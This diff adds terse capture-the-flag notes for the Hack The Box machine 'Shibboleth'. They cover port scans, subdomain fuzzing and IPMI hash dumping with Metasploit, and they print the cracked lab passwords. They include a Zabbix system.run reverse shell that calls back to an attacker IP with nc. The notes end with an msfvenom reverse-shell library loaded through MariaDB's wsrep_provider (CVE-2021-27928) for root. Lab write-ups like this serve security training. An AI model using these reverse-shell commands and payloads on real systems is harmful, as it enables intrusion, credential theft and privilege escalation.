@@ -1,0 +1,116 @@
+-nmap:
+TCP SCAN:
+        sudo nmap -sV -O -T4 -p- 10.10.11.124 -oA sV_Full
+        80/tcp    open     http    Apache httpd 2.4.41
+
+UDP SCAN:
+        sudo nmap -sU -T4 10.10.11.124 -oA sU_Top
+        623/udp   open          asf-rmcp
+
+
+- add shiobboleth to /etc/hosts
+
+
+- vhost fuzzing:
+        ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://shibboleth.htb/" -H "Host: FUZZ.shibboleth.htb" -fw 18
+
+        monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
+        monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
+        zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
+
+
+- added subdomain to /etc/hosts
+
+
+- fuzz files:
+        ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ -u "http://zabbix.shibboleth.htb/FUZZ" -fw 20
+
+
+        image.php               [Status: 200, Size: 1828, Words: 87, Lines: 23]
+        index.php               [Status: 200, Size: 3686, Words: 192, Lines: 30]
+        favicon.ico             [Status: 200, Size: 32988, Words: 13, Lines: 3]
+        history.php             [Status: 200, Size: 1830, Words: 87, Lines: 23]
+        robots.txt              [Status: 200, Size: 974, Words: 153, Lines: 23]
+        .                       [Status: 200, Size: 3686, Words: 192, Lines: 30]
+        map.php                 [Status: 200, Size: 1826, Words: 87, Lines: 23]
+        maintenance.php         [Status: 200, Size: 1834, Words: 87, Lines: 23]
+        setup.php               [Status: 200, Size: 1828, Words: 87, Lines: 23]
+        services.php            [Status: 200, Size: 1831, Words: 87, Lines: 23]
+        templates.php           [Status: 200, Size: 1832, Words: 87, Lines: 23]
+        report2.php             [Status: 200, Size: 1830, Words: 87, Lines: 23]
+        chart.php               [Status: 200, Size: 1828, Words: 87, Lines: 23]
+        items.php               [Status: 200, Size: 1828, Words: 87, Lines: 23]
+
+
+- port 623:
+        link: https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-
+        msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
+        msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE yes
+        OUTPUT_JOHN_FILE => yes
+
+        [+] 10.10.11.124:623 - IPMI - Hash found: Administrator:372c55a902240000202bfe05b3a932fdc37fa48dfbde0d194b4beb67937a0bd0f6a13190d4ce5f0ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:e464c6b1af9496bfcb0b61c1020477730f7d643b
+
+
+- john hash crack
+        john --wordlist=/usr/share/wordlists/rockyou.txt hash_john    (where hash_john is the file containing the hash in johntheripper format)
+        credentialfound:    ilovepumkinpie1  (10.10.11.124 Administrator)  
+
+
+- login with retrived credential in zabbix
+
+
+- revshell from zabbix:
+        go to configuration -> host -> click on "item" -> click on "create new item".
+        Name: rev_shell
+        Key: system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.43 8765 >/tmp/f &,nowait]
+        click add
+        now from the page that appears, from the list at the end, find the rev_shell, click on that, then put netcat in listening on local machine (nc -lnvp 8765) and then click the button "execute now"
+
+
+- shell upgrade:
+        /usr/bin/script -qc /bin/bash /dev/null
+
+
+- get user flag:
+        su ipmi-svc
+        Password: ilovepumkinpie1
+        cd
+        cat user.txt
+
+
+- trasport linpeas to the machine
+
+
+- run linpeas, way to escalate from linpeas output:
+        ╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
+        /etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh
+
+        ╔══════════╣ Active Ports
+        ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                                                     tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -  
+
+        (3306, MySQLDB)
+
+        ════════════════════════════════════╣ Software Information ╠════════════════════════════════════
+        ╔══════════╣ MySQL version                                                                                                                                                                                                                   mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+
+        From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = root 
+
+
+        ps -aux | grep -i 'sql'
+        root        1245  0.0  0.0   2608  1516 ?        S    06:08   0:00 /bin/sh /usr/bin/mysqld_safe
+        root      382853  0.0  1.3 605996 52952 ?        Sl   21:23   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock
+
+
+- CVE   link:https://github.com/Al1ex/CVE-2021-27928
+
+        First return to zabbix user, then generate payload with msfvenom and tranfer to target machine with zabbix user
+        on local machine: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.43 LPORT=8787 -f elf-so -o getroootttta.so
+        transport to target machine in /tmp (e.g. with python server)
+
+        open nc listener on local machine at payload port: nc -lnvp 8787
+        log into mysql from target machine (unless you do port forwarding) with:
+        mysql -u zabbix -p 
+        Enter password: bloooarskybluh
+
+        from mysql interface execute
+        SET GLOBAL wsrep_provider="/tmp/getroootttta.so";
